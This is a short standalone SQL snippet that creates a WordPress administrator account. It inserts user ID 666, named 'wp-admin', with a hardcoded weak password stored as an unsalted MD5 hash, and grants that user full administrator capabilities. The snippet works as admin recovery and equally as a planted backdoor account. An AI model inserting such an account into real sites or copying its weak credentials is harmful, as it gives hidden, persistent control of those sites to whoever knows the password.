


    INSERT INTO `wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('666', 'wp-admin', MD5('qwe123!'), 'John Connor', 'test@yourdomain.com', 'http://www.wordpress.org', '2011-06-07 00:00:00', '', '0', 'John Connor');
    INSERT INTO `wp_usermeta` VALUES ('', '666', 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
    INSERT INTO `wp_usermeta` VALUES ('', '666', 'wp_user_level', '10');
    